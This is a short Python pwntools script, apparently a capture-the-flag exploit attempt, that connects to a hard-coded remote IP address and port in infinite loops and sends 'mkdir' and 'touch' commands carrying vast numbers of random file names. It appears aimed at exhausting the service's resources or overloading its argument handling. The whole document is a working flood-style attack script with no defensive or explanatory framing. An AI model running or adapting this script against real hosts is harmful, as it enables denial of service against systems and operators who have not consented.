from pwn import *
import time
import threading
import random
import string
import hashlib

def randomFile():
    count = 0
    data = ''
    while True:
        p = remote('54.248.135.16', 1986)
        data = ''.join(random.choice(string.ascii_uppercase+string.digits) for _ in range(23)) + str(count)        
        p.sendlineafter('> ', f'mkdir A{data} B{data} C{data} D{data} E{data} F{data} G{data} H{data} I{data} J{data}')
        count = count +1
        p.close()

# add (argv)
def mkdirShock():
    log.success("NAMIN")

    payload = 'touch'
    count = 100000

    while True:
        p = remote('54.248.135.16', 1986)
        for i in range(0, 100000000):
            payload += ' '
            payload +=''.join(random.choice(string.ascii_uppercase+string.digits) for _ in range(3))
            payload += str(count)+str(i)
            
        # print(payload)
        p.sendlineafter('> ', payload+str(count))
        count = count + 1
        p.close()


if __name__ == "__main__":
    #context.log_level = 'debug'
    # nc 54.248.135.16 1986
    count = 17020
    mkdirShock()

    # thr = threading.Thread(target=mkdirShock)
    # thr.setDaemon(0)
    # thr.start()

    # thr = threading.Thread(target=randomFile)
    # thr.setDaemon(0)
    # thr.start()

    

    # while True:
    #     p = remote('54.248.135.16', 1986)
    #     p.sendlineafter('> ', f'touch A{count} B{count} C{count} D{count} E{count} F{count} G{count} H{count} I{count} J{count} K{count} L{count} N{count} M{count} O{count} P{count} AA{count} BB{count} CC{count} DD{count} EE{count} FF{count} GG{count} HH{count} II{count} JJ{count} KK{count} LL{count} NN{count} MM{count} OO{count} PP{count}')
    #     count = count +1
    #     # time.sleep(1)
    #     # p.sendlineafter('> ', 'ls')
    #     p.close()
